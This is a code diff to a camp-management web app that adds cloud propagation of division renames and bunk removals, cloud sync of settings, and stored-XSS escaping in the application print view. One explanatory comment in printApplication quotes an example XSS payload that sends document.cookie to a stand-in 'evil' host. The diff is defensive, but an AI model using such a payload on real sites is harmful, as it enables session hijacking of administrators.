+    // Iterate grade rows in DOM order so drag-reorder is preserved.
+    var rows=document.querySelectorAll('#dmGrades .dm-grade-row');
+    rows.forEach(function(row){
+        var nameEl=row.querySelector('.dmGradeN');
+        var gn=nameEl?nameEl.value.trim():'';
+        if(!gn)return;
+        var bunks=Array.prototype.map.call(row.querySelectorAll('.me-bunk-chip .me-bunk-name'),function(s){return s.textContent.trim()}).filter(Boolean);
         grades[gn]={bunks:bunks};
     });
     if(editingDiv&&editingDiv!==name){
-        // Rename: update roster references
+        // Rename: update roster references AND propagate to schedule records
         Object.values(roster).forEach(function(c){if(c.division===editingDiv){c.division=name}});
         delete structure[editingDiv];
+        // ★ v2: Propagate rename to in-memory + cloud schedules so divisionTimes
+        //   keys, _division slot references, and any division-keyed sub-structures
+        //   stay consistent. Silent staleness here previously caused UI/print/
+        //   analytics paths to lose schedule data for the renamed division.
+        _propagateDivisionRename(editingDiv, name);
     }
-    structure[name]={color:color,grades:grades};
+    var gradeOrder=[];
+    rows.forEach(function(row){
+        var gn=row.querySelector('.dmGradeN');
+        var n=gn?gn.value.trim():'';
+        if(n)gradeOrder.push(n);
+    });
+    structure[name]={color:color,grades:grades,gradeOrder:gradeOrder};
     save();closeModal('divModal');render(curPage);toast(editingDiv?'Division updated':'Division created');
+    // ★ Purge orphaned bunks from saved schedules
+    var newBunks=[];
+    Object.values(grades).forEach(function(g){(g.bunks||[]).forEach(function(b){newBunks.push(b)})});
+    var removed=oldBunks.filter(function(b){return newBunks.indexOf(b)===-1});
+    if(removed.length>0)_purgeOrphanedBunks(removed);
 }
-function deleteDiv(n){if(!confirm('Delete "'+n+'"?'))return;delete structure[n];Object.values(roster).forEach(function(c){if(c.division===n){c.division='';c.grade='';c.bunk=''}});save();render(curPage);toast('Deleted')}
+function deleteDiv(n){
+    if(!confirm('Delete "'+n+'"?'))return;
+    // ★ Collect all bunks from this division before deleting
+    var removedBunks=[];
+    if(structure[n]&&structure[n].grades){
+        Object.values(structure[n].grades).forEach(function(g){(g.bunks||[]).forEach(function(b){removedBunks.push(b)})});
+    }
+    delete structure[n];Object.values(roster).forEach(function(c){if(c.division===n){c.division='';c.grade='';c.bunk=''}});save();render(curPage);toast('Deleted');
+    // ★ Purge orphaned bunks from saved schedules
+    if(removedBunks.length>0)_purgeOrphanedBunks(removedBunks);
+}
+// ★ Propagate a division rename to all schedule references.
+//   Renames in-memory divisionTimes / unifiedTimes keys, rewrites _division
+//   fields in slot entries, and updates cloud daily_schedules records.
+function _propagateDivisionRename(oldName, newName){
+    if(!oldName||!newName||oldName===newName)return;
+    console.log('[Me] Propagating division rename:',oldName,'→',newName);
+    // 1. In-memory rename — divisionTimes, unifiedTimes, divisions, availableDivisions
+    function _renameKey(obj){
+        if(!obj||typeof obj!=='object'||Array.isArray(obj))return;
+        if(oldName in obj){obj[newName]=obj[oldName];delete obj[oldName]}
+    }
+    _renameKey(window.divisionTimes);
+    _renameKey(window.unifiedTimes);
+    _renameKey(window.divisions);
+    if(Array.isArray(window.availableDivisions)){
+        var idx=window.availableDivisions.indexOf(oldName);
+        if(idx>=0)window.availableDivisions[idx]=newName;
+    }
+    // 2. Rewrite _division field on every slot in current scheduleAssignments
+    if(window.scheduleAssignments){
+        Object.values(window.scheduleAssignments).forEach(function(slots){
+            if(!Array.isArray(slots))return;
+            slots.forEach(function(s){
+                if(s&&s._division===oldName)s._division=newName;
+            });
+        });
+    }
+    // 3. Propagate to cloud daily_schedules
+    function _toast(msg, kind){
+        try{
+            if(typeof window.showToast==='function')window.showToast(msg, kind||'info');
+            else if(typeof window.toast==='function')window.toast(msg, kind||'info');
+        }catch(_){}
+    }
+    function _retry(fn, label){
+        var attempt=0, max=3;
+        function tryOnce(){
+            attempt++;
+            return fn().catch(function(err){
+                if(attempt>=max)throw err;
+                return new Promise(function(r){setTimeout(r, Math.pow(2,attempt-1)*500)}).then(tryOnce);
+            });
+        }
+        return tryOnce();
+    }
+    try{
+        var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():window.supabase;
+        var campId=window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():(window.getCampId?window.getCampId():null);
+        if(!client||!campId){
+            _toast('⚠️ Division renamed locally but cloud schedules not updated (DB unavailable).','warning');
+            return;
+        }
+        _retry(function(){
+            return client.from('daily_schedules').select('id,schedule_data').eq('camp_id',campId)
+                .then(function(r){if(r.error)throw r.error;return r.data||[]});
+        },'fetch').then(function(records){
+            var updates=[];
+            records.forEach(function(record){
+                var sd=record.schedule_data||{};
+                var modified=false;
+                // Rename division-keyed sub-structures
+                ['divisionTimes','unifiedTimes'].forEach(function(k){
+                    if(sd[k]&&typeof sd[k]==='object'&&oldName in sd[k]){
+                        sd[k]=Object.assign({},sd[k]);
+                        sd[k][newName]=sd[k][oldName];
+                        delete sd[k][oldName];
+                        modified=true;
+                    }
+                });
+                // Rewrite _division refs in each slot
+                if(sd.scheduleAssignments&&typeof sd.scheduleAssignments==='object'){
+                    var newSa=Object.assign({},sd.scheduleAssignments);
+                    Object.keys(newSa).forEach(function(bunk){
+                        var slots=newSa[bunk];
+                        if(!Array.isArray(slots))return;
+                        var slotChanged=false;
+                        var newSlots=slots.map(function(s){
+                            if(s&&s._division===oldName){slotChanged=true;return Object.assign({},s,{_division:newName})}
+                            return s;
+                        });
+                        if(slotChanged){newSa[bunk]=newSlots;modified=true}
+                    });
+                    if(modified)sd.scheduleAssignments=newSa;
+                }
+                if(modified){
+                    updates.push(_retry(function(){
+                        return client.from('daily_schedules')
+                            .update({schedule_data:sd,updated_at:new Date().toISOString()})
+                            .eq('id',record.id)
+                            .then(function(r){if(r.error)throw r.error;return r});
+                    },'update '+record.id));
+                }
+            });
+            if(updates.length===0){
+                console.log('[Me] No schedule records referenced the renamed division');
+                return;
+            }
+            return Promise.allSettled(updates).then(function(results){
+                var failed=results.filter(function(r){return r.status==='rejected'});
+                var ok=results.length-failed.length;
+                if(failed.length===0){
+                    console.log('[Me] ✅ Renamed division in',ok,'schedule records');
+                }else{
+                    console.error('[Me] ❌ Division rename had',failed.length,'failures:',failed);
+                    _toast('⚠️ Division renamed but '+failed.length+' schedule record(s) failed. Some old data may persist.','warning');
+                }
+            });
+        }).catch(function(err){
+            console.error('[Me] Division rename propagation failed:',err);
+            _toast('⚠️ Division renamed locally but cloud propagation failed: '+(err.message||err),'error');
+        });
+    }catch(e){
+        console.error('[Me] Division rename exception:',e);
+        _toast('⚠️ Division renamed but cloud cleanup hit an error.','error');
+    }
+}
+
+// ★ Remove orphaned bunk data from all saved schedule records.
+//   When a bunk is removed from camp structure, its schedule data becomes
+//   invisible to the UI but persists in Supabase. This cleans it up.
+//   v2: Adds retry-on-failure (3 attempts) and surfaces failures via toast
+//       so silent network errors don't leave orphan data in the cloud.
+function _purgeOrphanedBunks(removedBunks){
+    if(!removedBunks||removedBunks.length===0)return;
+    console.log('[Me] Purging',removedBunks.length,'orphaned bunks from schedules:',removedBunks);
+    // 1. Clean from in-memory schedule (current session)
+    if(window.scheduleAssignments){
+        removedBunks.forEach(function(b){delete window.scheduleAssignments[b]});
+    }
+    if(window.scheduleSegments){
+        removedBunks.forEach(function(b){delete window.scheduleSegments[b]});
+    }
+    // Local toast helper (no-op if Campistry's toast helper isn't loaded)
+    function _toast(msg, kind){
+        try{
+            if(typeof window.showToast==='function')window.showToast(msg, kind||'info');
+            else if(typeof window.toast==='function')window.toast(msg, kind||'info');
+        }catch(_){}
+    }
+    // Retry helper with exponential backoff (max 3 attempts)
+    function _retryWithBackoff(fn, label){
+        var attempt=0, maxAttempts=3;
+        function tryOnce(){
+            attempt++;
+            return fn().catch(function(err){
+                if(attempt>=maxAttempts)throw err;
+                var delay=Math.pow(2, attempt-1)*500; // 500ms, 1s, 2s
+                console.warn('[Me] '+label+' attempt '+attempt+' failed, retrying in '+delay+'ms:',err);
+                return new Promise(function(resolve){setTimeout(resolve, delay)}).then(tryOnce);
+            });
+        }
+        return tryOnce();
+    }
+    // 2. Clean from all cloud schedule records (async, with retry + toast on failure)
+    try{
+        var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():window.supabase;
+        var campId=window.CampistryDB&&window.CampistryDB.getCampId?window.CampistryDB.getCampId():(window.getCampId?window.getCampId():null);
+        if(!client||!campId){
+            console.warn('[Me] Cannot purge cloud — DB not available');
+            _toast('⚠️ Removed bunk locally but could not clean cloud data (DB unavailable). Refresh to retry.','warning');
+            return;
+        }
+        _retryWithBackoff(function(){
+            return client.from('daily_schedules').select('id,schedule_data').eq('camp_id',campId)
+                .then(function(res){
+                    if(res.error)throw res.error;
+                    return res.data||[];
+                });
+        },'fetch').then(function(records){
+            var updates=[];
+            records.forEach(function(record){
+                var sd=record.schedule_data||{};
+                var sa=Object.assign({},sd.scheduleAssignments||{});
+                var la=Object.assign({},sd.leagueAssignments||{});
+                var modified=false;
+                removedBunks.forEach(function(b){
+                    if(sa[b]!==undefined){delete sa[b];modified=true}
+                    if(la[b]!==undefined){delete la[b];modified=true}
+                });
+                if(modified){
+                    updates.push(_retryWithBackoff(function(){
+                        return client.from('daily_schedules')
+                            .update({schedule_data:Object.assign({},sd,{scheduleAssignments:sa,leagueAssignments:la}),updated_at:new Date().toISOString()})
+                            .eq('id',record.id)
+                            .then(function(r){if(r.error)throw r.error;return r});
+                    },'update '+record.id));
+                }
+            });
+            if(updates.length===0){
+                console.log('[Me] No schedule records contained orphaned bunks');
+                return;
+            }
+            // Use allSettled so one bad record doesn't kill the rest
+            return Promise.allSettled(updates).then(function(results){
+                var failed=results.filter(function(r){return r.status==='rejected'});
+                var ok=results.length-failed.length;
+                if(failed.length===0){
+                    console.log('[Me] ✅ Purged orphaned bunks from',ok,'schedule records');
+                }else{
+                    console.error('[Me] ❌ Purge had',failed.length,'failures (',ok,'succeeded):',failed);
+                    _toast('⚠️ Bunk removed, but '+failed.length+' schedule record(s) failed to update. Try removing again or check connection.','warning');
+                }
+            });
+        }).catch(function(err){
+            console.error('[Me] Purge failed after retries:',err);
+            _toast('⚠️ Removed bunk locally but cloud cleanup failed: '+(err.message||err)+'. Try again.','error');
+        });
+    }catch(e){
+        console.error('[Me] Purge exception:',e);
+        _toast('⚠️ Bunk removed locally but cloud cleanup hit an error. Refresh and try again.','error');
+    }
+}
 
 // ── BUNK BUILDER ─────────────────────────────────────────────────
 function renderBB(){
@@ -1245,32 +1788,49 @@ function saveAppNote(id){
 function printApplication(id){
     var e=enrollments[id];if(!e)return;
     var w=window.open('','_blank','width=800,height=900');
-    var h='<html><head><title>Application — '+e.camperName+'</title><style>body{font-family:Arial,sans-serif;padding:30px;font-size:13px;color:#1E293B}h1{font-size:18px;margin:0 0 4px}h2{font-size:13px;color:#D97706;text-transform:uppercase;margin:16px 0 6px;border-bottom:1px solid #E2E8F0;padding-bottom:3px}table{width:100%;border-collapse:collapse}td{padding:3px 0;vertical-align:top}td:first-child{width:120px;color:#64748B;font-weight:600}.med{color:#EF4444;font-weight:600}.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700}img{max-width:250px;height:70px;object-fit:contain;border:1px solid #E2E8F0;border-radius:4px}@media print{body{padding:15px}}</style></head><body>';
-    h+='<h1>'+esc(e.camperName)+'</h1>';
-    h+='<div style="color:#64748B;font-size:12px;margin-bottom:12px">Application ID: '+esc(id)+' · Status: '+e.status+' · Applied: '+e.appliedDate+'</div>';
 
-    function sec(t){return'<h2>'+t+'</h2><table>'}
-    function row(l,v){return v?'<tr><td>'+l+'</td><td>'+v+'</td></tr>':''}
+    // Stored-XSS hardening: every enrollment field originates from the
+    // unauthenticated public registration form. Earlier this helper
+    // interpolated raw values directly into HTML — an attacker submitting
+    // `e.medicalNotes = "<img src=x onerror=fetch('//evil/?'+document.cookie)>"`
+    // would execute in the admin's print window, with full session.
+    // Now: row() escapes by default; rowRaw() exists for pre-built HTML;
+    // signature is validated against a strict data-URL allow-list.
+
+    function sec(t){return'<h2>'+esc(t)+'</h2><table>'}
+    function row(l,v){return v?'<tr><td>'+esc(l)+'</td><td>'+esc(v)+'</td></tr>':''}
+    function rowRaw(l,html){return html?'<tr><td>'+esc(l)+'</td><td>'+html+'</td></tr>':''}
     function end(){return'</table>'}
 
+    function isSafeImageDataUrl(s){
+        // Data URLs only; PNG / JPEG / GIF / WebP / SVG-data variants we can't
+        // distinguish are excluded. SVG can carry script — never accept it.
+        return typeof s === 'string' &&
+               /^data:image\/(png|jpeg|jpg|gif|webp);base64,[A-Za-z0-9+\/=]+$/.test(s);
+    }
+
+    var h='<html><head><title>'+esc('Application — '+e.camperName)+'</title><style>body{font-family:Arial,sans-serif;padding:30px;font-size:13px;color:#1E293B}h1{font-size:18px;margin:0 0 4px}h2{font-size:13px;color:#D97706;text-transform:uppercase;margin:16px 0 6px;border-bottom:1px solid #E2E8F0;padding-bottom:3px}table{width:100%;border-collapse:collapse}td{padding:3px 0;vertical-align:top}td:first-child{width:120px;color:#64748B;font-weight:600}.med{color:#EF4444;font-weight:600}.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700}img{max-width:250px;height:70px;object-fit:contain;border:1px solid #E2E8F0;border-radius:4px}@media print{body{padding:15px}}</style></head><body>';
+    h+='<h1>'+esc(e.camperName)+'</h1>';
+    h+='<div style="color:#64748B;font-size:12px;margin-bottom:12px">Application ID: '+esc(id)+' · Status: '+esc(e.status)+' · Applied: '+esc(e.appliedDate)+'</div>';
+
     h+=sec('Camper');
-    h+=row('Name',esc(e.camperName));h+=row('DOB',e.dob);h+=row('Gender',e.gender);
+    h+=row('Name',e.camperName);h+=row('DOB',e.dob);h+=row('Gender',e.gender);
     h+=row('School',e.school);h+=row('Grade',e.schoolGrade);h+=row('Teacher',e.teacher);h+=end();
 
     h+=sec('Parent/Guardian');
-    h+=row('Name',esc(e.parentName)+(e.parentRelation?' ('+e.parentRelation+')':''));
+    h+=row('Name',e.parentName+(e.parentRelation?' ('+e.parentRelation+')':''));
     h+=row('Phone',e.parentPhone);h+=row('Email',e.parentEmail);
-    if(e.parent2Name)h+=row('Parent 2',esc(e.parent2Name)+(e.parent2Phone?' — '+e.parent2Phone:''));h+=end();
+    if(e.parent2Name)h+=row('Parent 2',e.parent2Name+(e.parent2Phone?' — '+e.parent2Phone:''));h+=end();
 
     h+=sec('Address');
     h+=row('Street',e.street);h+=row('City',e.city);h+=row('State',e.state);h+=row('ZIP',e.zip);h+=end();
 
     h+=sec('Emergency Contact');
-    h+=row('Name',esc(e.emergencyName)+(e.emergencyRel?' ('+e.emergencyRel+')':''));h+=row('Phone',e.emergencyPhone);h+=end();
+    h+=row('Name',e.emergencyName+(e.emergencyRel?' ('+e.emergencyRel+')':''));h+=row('Phone',e.emergencyPhone);h+=end();
 
     h+=sec('Medical');
-    h+=row('Allergies',e.allergies?'<span class="med">'+esc(e.allergies)+'</span>':'None');
-    h+=row('Medications',e.medications?'<span class="med">'+esc(e.medications)+'</span>':'None');
+    h+=rowRaw('Allergies',e.allergies?'<span class="med">'+esc(e.allergies)+'</span>':esc('None'));
+    h+=rowRaw('Medications',e.medications?'<span class="med">'+esc(e.medications)+'</span>':esc('None'));
     h+=row('Dietary',e.dietary||'None');h+=row('Notes',e.medicalNotes);h+=end();
 
     h+=sec('Preferences');
@@ -1286,7 +1846,7 @@ function printApplication(id){
         var labels=e.customQuestionLabels||[];
         Object.entries(e.customAnswers).forEach(function([key,val]){
             var idx=parseInt(key.replace('q',''));var label=labels[idx]||('Question '+(idx+1));
-            h+=row(label,Array.isArray(val)?val.join(', '):esc(val));
+            h+=row(label,Array.isArray(val)?val.join(', '):val);
         });h+=end();
     }
 
@@ -1295,11 +1855,18 @@ function printApplication(id){
         e.documents.forEach(function(d){h+='<div style="padding:2px 0">📄 '+esc(d.name)+'</div>'});
     }
 
-    if(e.signature){h+=sec('Signature');h+='<img src="'+e.signature+'">';}
+    if(e.signature){
+        h+=sec('Signature');
+        if(isSafeImageDataUrl(e.signature)){
+            h+='<img src="'+e.signature+'">';
+        }else{
+            h+='<div style="color:#94A3B8;font-size:11px">[Signature omitted — invalid image format]</div>';
+        }
+    }
 
     if(e.adminNotes){h+=sec('Admin Notes');h+='<p>'+esc(e.adminNotes)+'</p>';}
 
-    h+='<div style="margin-top:30px;font-size:11px;color:#94A3B8;border-top:1px solid #E2E8F0;padding-top:10px">Printed from Campistry Me · '+new Date().toLocaleString()+'</div>';
+    h+='<div style="margin-top:30px;font-size:11px;color:#94A3B8;border-top:1px solid #E2E8F0;padding-top:10px">Printed from Campistry Me · '+esc(new Date().toLocaleString())+'</div>';
     h+='</body></html>';
     w.document.write(h);w.document.close();
     setTimeout(function(){w.print()},300);
@@ -2727,7 +3294,16 @@ function removeBroadcast(idx){
 // ═══════════════════════════════════════════════════════════════
 var campForms=[];
 function loadForms(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');campForms=(s.campistryMe&&s.campistryMe.forms)||[]}
-function saveForms(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');if(!s.campistryMe)s.campistryMe={};s.campistryMe.forms=campForms;localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s))}
+function saveForms(){
+    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
+    if(!s.campistryMe)s.campistryMe={};
+    s.campistryMe.forms=campForms;
+    localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    // Route through saveGlobalSettings so the value reaches IDB + cloud.
+    // Writing localStorage alone left forms cloud-orphaned.
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
+        window.saveGlobalSettings('campistryMe',s.campistryMe);
+}
 
 function renderForms(){
     loadForms();
@@ -2945,6 +3521,11 @@ function saveSettings(){
     s.camp_name=document.getElementById('settCampName').value.trim();
     s.campName=s.camp_name;
     localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    // Fan out to cloud — localStorage alone never reached Supabase.
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function'){
+        window.saveGlobalSettings('camp_name',s.camp_name);
+        window.saveGlobalSettings('campName',s.camp_name);
+    }
     save();toast('Settings saved');
 }
 function saveLocaleSettings(){
@@ -2957,6 +3538,8 @@ function saveLocaleSettings(){
         rtl:document.getElementById('settRTL').checked
     };
     localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
+        window.saveGlobalSettings('campistryMe',s.campistryMe);
     // Apply RTL immediately
     if(s.campistryMe.campSettings.rtl) document.documentElement.setAttribute('dir','rtl');
     else document.documentElement.removeAttribute('dir');
@@ -2967,6 +3550,8 @@ function saveStripeKey(){
     if(!s.campistryMe)s.campistryMe={};
     s.campistryMe.stripePublishableKey=(document.getElementById('settStripeKey').value||'').trim();
     localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
+        window.saveGlobalSettings('campistryMe',s.campistryMe);
     save();toast('Stripe key saved');
 }
 function exportAllData(){
@@ -2983,6 +3568,15 @@ function importAllData(){
                 var data=JSON.parse(e.target.result);
                 if(!confirm('This will replace ALL your data. Are you sure?'))return;
                 localStorage.setItem('campGlobalSettings_v1',JSON.stringify(data));
+                // Fan out every imported top-level key to cloud — without
+                // this, importing on Device A leaves Device B reading the
+                // pre-import cloud state on next hydration.
+                if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function'){
+                    Object.keys(data||{}).forEach(function(k){
+                        if(k==='updated_at')return;
+                        try{window.saveGlobalSettings(k,data[k]);}catch(e){console.warn('Import sync failed for',k,e);}
+                    });
+                }
                 loadData();render(curPage);toast('Data imported');
             }catch(err){alert('Invalid file: '+err.message)}
         };r.readAsText(inp.files[0]);
@@ -3080,7 +3674,14 @@ function reEnrollCamper(camperName){
 // ═══════════════════════════════════════════════════════════════
 var customFields=[];
 function loadCustomFields(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');customFields=(s.campistryMe&&s.campistryMe.customFields)||[]}
-function saveCustomFields(){var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');if(!s.campistryMe)s.campistryMe={};s.campistryMe.customFields=customFields;localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s))}
+function saveCustomFields(){
+    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
+    if(!s.campistryMe)s.campistryMe={};
+    s.campistryMe.customFields=customFields;
+    localStorage.setItem('campGlobalSettings_v1',JSON.stringify(s));
+    if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function')
+        window.saveGlobalSettings('campistryMe',s.campistryMe);
+}
 function manageCustomFields(){
     loadCustomFields();
     var h='<p style="font-size:.85rem;color:var(--s600);margin-bottom:14px">Define custom fields that appear on every camper profile.</p><div id="cfList">';
@@ -3291,8 +3892,21 @@ function importRows(rows){
     // Clear Go addresses too
     try{var goRaw=localStorage.getItem('campistry_go_data');var goData=goRaw?JSON.parse(goRaw):{};goData.addresses={};localStorage.setItem('campistry_go_data',JSON.stringify(goData))}catch(e){}
     // Also wipe the cloud settings so stale data doesn't survive
+    // ★ Preserve existing grade times (startTime/endTime) from app1.divisions
+    //   so they survive re-imports. Times are configured in Flow and are
+    //   independent of camper/roster data.
+    var _preservedGradeTimes={};
     try{
         var g=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
+        // Snapshot grade times before wiping
+        if(g.app1&&g.app1.divisions){
+            Object.entries(g.app1.divisions).forEach(function(pair){
+                var k=pair[0],v=pair[1];
+                if(v&&(v.startTime||v.endTime)){
+                    _preservedGradeTimes[k]={startTime:v.startTime||'',endTime:v.endTime||''};
+                }
+            });
+        }
         g.campStructure={};
         if(!g.app1)g.app1={};
         g.app1.camperRoster={};
@@ -3302,6 +3916,13 @@ function importRows(rows){
         g.campistryMe.bunkAssignments={};
         g.campistryMe.nextCamperId=1;
         localStorage.setItem('campGlobalSettings_v1',JSON.stringify(g));
+        // Fan the wipe out to cloud — otherwise the next hydration
+        // re-pulls the pre-wipe roster/families and undoes the reset.
+        if(typeof window!=='undefined'&&typeof window.saveGlobalSettings==='function'){
+            window.saveGlobalSettings('campStructure',g.campStructure);
+            window.saveGlobalSettings('app1',g.app1);
+            window.saveGlobalSettings('campistryMe',g.campistryMe);
+        }
     }catch(e){}
 
     // ═══ PASS 1: Build camp structure from CSV data ═══
@@ -3414,7 +4035,37 @@ function importRows(rows){
     });
 
     // ═══ SAVE & REPORT ═══
-    save();closeModal('csvModal');render(curPage);
+    save();
+
+    // ★ Restore preserved grade times into app1.divisions
+    //   save() writes campStructure but deliberately skips app1.divisions
+    //   (owned by app1/Flow). We write the preserved times as stub entries
+    //   so that when app1.loadData() next rebuilds divisions from the new
+    //   campStructure, it finds times in existingTimes and carries them over.
+    if(Object.keys(_preservedGradeTimes).length>0){
+        try{
+            var curSettings=window.loadGlobalSettings?.() || {};
+            var curApp1=curSettings.app1||{};
+            var restoredDivs=curApp1.divisions||{};
+            var timesRestored=0;
+            Object.entries(_preservedGradeTimes).forEach(function(pair){
+                var gradeName=pair[0],times=pair[1];
+                // Create or update the entry — app1.loadData() reads startTime/endTime
+                // from these entries via its existingTimes snapshot (app1.js ~line 874-884)
+                if(!restoredDivs[gradeName])restoredDivs[gradeName]={};
+                restoredDivs[gradeName].startTime=times.startTime;
+                restoredDivs[gradeName].endTime=times.endTime;
+                timesRestored++;
+            });
+            if(timesRestored>0){
+                curApp1.divisions=restoredDivs;
+                window.saveGlobalSettings?.('app1',curApp1);
+                console.log('[Me] Restored grade times for',timesRestored,'grades after import');
+            }
+        }catch(e){console.warn('[Me] Failed to restore grade times:',e)}
+    }
+
+    closeModal('csvModal');render(curPage);
 
     // Build summary
     var summary=added+' campers imported';
@@ -3452,35 +4103,14 @@ function exportCsv(){
 }
 
 // ═══ BOOT ════════════════════════════════════════════════════════
-// Photo upload (stores as base64 data URL in camper record)
-function uploadPhoto(camperName){
-    var inp=document.createElement('input');
-    inp.type='file';inp.accept='image/*';
-    inp.onchange=function(){
-        var file=inp.files[0];if(!file)return;
-        if(file.size>2*1024*1024){toast('Photo must be under 2MB','error');return}
-        var reader=new FileReader();
-        reader.onload=function(e){
-            if(roster[camperName]){
-                roster[camperName].photoUrl=e.target.result;
-                save();
-                viewCamper(camperName); // refresh the modal
-                toast('Photo added');
-            }
-        };
-        reader.readAsDataURL(file);
-    };
-    inp.click();
-}
-
 if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',init);else init();
 
 window.CampistryMe={
     nav:nav,closeModal:closeModal,
-    viewCamper:viewCamper,editCamper:editCamper,addCamper:addCamper,
+    viewCamper:viewCamper,editCamper:editCamper,addCamper:addCamper,deleteCamper:deleteCamper,
     addFamily:function(){openFamilyForm(null)},editFamily:function(id){openFamilyForm(id)},
     acceptFamilySuggestion:acceptFamilySuggestion,dismissFamilySuggestion:dismissFamilySuggestion,acceptAddToFamily:acceptAddToFamily,
-    addDiv:function(){openDivForm(null)},editDiv:function(n){openDivForm(n)},deleteDiv:deleteDiv,
+    addDiv:function(){openDivForm(null)},editDiv:function(n){openDivForm(n)},deleteDiv:deleteDiv,moveDivision:moveDivision,
     openCsv:function(){openModal('csvModal')},exportCsv:exportCsv,downloadTemplate:downloadTemplate,
     bbDrop:bbDrop,autoAssign:autoAssign,clearBunks:clearBunks,
     addSession:addSession,deleteSession:deleteSession,editSession:editSession,toggleSessionReg:toggleSessionReg,copyRegLink:copyRegLink,addApplication:addApplication,autoPromoteWaitlist:autoPromoteWaitlist,
@@ -3494,7 +4124,6 @@ window.CampistryMe={
     finExportCSV:finExportCSV,finExportQB:finExportQB,finExportIIF:finExportIIF,
     finExportXero:finExportXero,finExportJournal:finExportJournal,finImportCSV:finImportCSV,
     _pickColor:_pickColor,_addGradeRow:_addGradeRow,
-    uploadPhoto:uploadPhoto,
     // Billing — family ledger system
     openPaymentModal:openPaymentModal,openPaymentForFamily:openPaymentForFamily,removePayment:removePayment,
     addCharge:addCharge,addChargeForFamily:addChargeForFamily,
